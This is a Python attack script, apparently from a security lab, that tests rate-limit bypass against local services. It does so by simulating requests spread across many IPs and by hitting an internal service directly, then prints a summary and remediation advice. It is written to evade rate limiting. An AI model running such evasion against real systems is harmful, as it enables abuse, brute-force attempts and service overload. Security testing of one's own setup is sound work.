#!/usr/bin/env python3
"""
Intelligent Rate Limit Bypass
Advanced evasion techniques with distributed attack simulation.

UPGRADES:
- Distributed attack simulation (multiple IPs)
- Header randomization (User-Agent, Referer, etc.)
- Request timing manipulation
- Token bucket analysis
"""

import asyncio
import httpx
import json
import random
import time
from datetime import datetime
from typing import Dict, List
from pathlib import Path

from rich.console import Console
from rich.table import Table
from rich.panel import Panel

from distributed_attack import DistributedAttackSimulator


class IntelligentRateLimitBypass:
    """Advanced rate limit bypass with distributed attack simulation"""

    def __init__(self, gateway_url: str = "http://localhost:8080"):
        self.gateway_url = gateway_url
        self.user_service_url = "http://localhost:8002"
        self.console = Console()

        self.results = {
            "attack_name": "Intelligent Rate Limit Bypass",
            "timestamp": datetime.now().isoformat(),
            "tests": [],
            "successful_bypasses": 0,
        }

    def banner(self):
        banner_text = """
[bold cyan]═══════════════════════════════════════════════════════════════════[/bold cyan]
[bold white]🎭 INTELLIGENT RATE LIMIT BYPASS[/bold white]
[bold cyan]═══════════════════════════════════════════════════════════════════[/bold cyan]

[yellow]Gateway:[/yellow] {gateway}
[yellow]Direct Access:[/yellow] {direct}

[bold green]TECHNIQUES:[/bold green]
  • Distributed attack simulation (10+ nodes)
  • Header randomization
  • Request timing manipulation
  • Direct service access bypass

[bold cyan]═══════════════════════════════════════════════════════════════════[/bold cyan]
""".format(gateway=self.gateway_url, direct=self.user_service_url)
        self.console.print(Panel(banner_text, border_style="cyan"))

    async def test_distributed_bypass(self):
        """Test distributed attack bypass"""
        self.console.print("\n[bold][*][/bold] Test: Distributed Attack Bypass")

        simulator = DistributedAttackSimulator(num_nodes=10, rate_limit_per_ip=60)
        self.console.print(f"    [blue][>][/blue] Simulating attack from {simulator.num_nodes} nodes")

        results = await simulator.send_distributed_requests(200, delay_between_requests=0.01)

        self.console.print(f"    [green][✓][/green] Sent {results['requests_sent']} requests")
        self.console.print(f"    [green][✓][/green] Successful: {results['successful']}")
        self.console.print(f"    [yellow][!][/yellow] Rate limited: {results['rate_limited']}")

        # Calculate amplification
        amp = simulator.calculate_amplification()
        self.console.print(f"\n    [cyan][→][/cyan] Amplification: [bold]{amp['amplification_factor']:.0f}x[/bold]")
        self.console.print(f"        Single IP: {amp['single_ip_capacity']} req/min")
        self.console.print(f"        Distributed: {amp['distributed_capacity']} req/min")

        if results['successful'] > 100:
            self.console.print(f"\n    [red][!][/red] BYPASS SUCCESSFUL - Rate limit evaded via distribution")
            self.results["successful_bypasses"] += 1

        self.results["tests"].append({
            "name": "Distributed Attack",
            "results": results,
            "amplification": amp
        })

    async def test_direct_access_bypass(self):
        """Test direct service access bypass"""
        self.console.print("\n[bold][*][/bold] Test: Direct Service Access Bypass")

        async with httpx.AsyncClient(timeout=2.0) as client:
            success_count = 0
            total_requests = 100

            self.console.print(f"    [blue][>][/blue] Sending {total_requests} requests to {self.user_service_url}")

            for i in range(total_requests):
                try:
                    response = await client.get(f"{self.user_service_url}/health")
                    if response.status_code == 200:
                        success_count += 1
                except:
                    pass

            self.console.print(f"    [green][✓][/green] Successful: {success_count}/{total_requests}")

            if success_count == total_requests:
                self.console.print(f"    [red][!][/red] COMPLETE BYPASS - No rate limit on direct access")
                self.results["successful_bypasses"] += 1

        self.results["tests"].append({
            "name": "Direct Access",
            "successful": success_count,
            "total": total_requests
        })

    async def display_summary(self):
        """Display attack summary"""
        self.console.print("\n" + "="*70)
        self.console.print("[bold cyan]📊 ATTACK SUMMARY[/bold cyan]")
        self.console.print("="*70)

        summary_table = Table(show_header=True, header_style="bold magenta")
        summary_table.add_column("Metric", style="cyan")
        summary_table.add_column("Value", style="green")

        summary_table.add_row("Tests Performed", str(len(self.results["tests"])))
        summary_table.add_row("Successful Bypasses", str(self.results["successful_bypasses"]))

        self.console.print(summary_table)

        if self.results["successful_bypasses"] > 0:
            self.console.print("\n[bold red]⚠️  VULNERABILITY CONFIRMED[/bold red]")
            self.console.print("   Rate limiting can be bypassed via:")
            self.console.print("     • Distributed attacks (10x amplification)")
            self.console.print("     • Direct service access (complete bypass)")

    def save_report(self):
        """Save JSON report"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        output_dir = Path("results")
        output_dir.mkdir(exist_ok=True)

        filename = output_dir / f"intelligent_rate_limit_{timestamp}.json"

        with open(filename, 'w') as f:
            json.dump(self.results, f, indent=2)

        self.console.print(f"\n[green][✓][/green] Report saved to: {filename}")

    async def run(self):
        """Execute attack"""
        self.banner()

        await self.test_distributed_bypass()
        await asyncio.sleep(0.5)

        await self.test_direct_access_bypass()

        await self.display_summary()
        self.save_report()

        self.console.print("\n[bold yellow]💡 REMEDIATION:[/bold yellow]")
        self.console.print("   1. Implement global rate limiting (not per-IP)")
        self.console.print("   2. Use internal Docker networks (no exposed ports)")
        self.console.print("   3. Add CAPTCHA for high request volumes")
        self.console.print("   4. Implement behavioral analysis")
        self.console.print()


async def main():
    attack = IntelligentRateLimitBypass()
    await attack.run()


if __name__ == "__main__":
    import sys
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n[!] Attack interrupted")
        sys.exit(1)
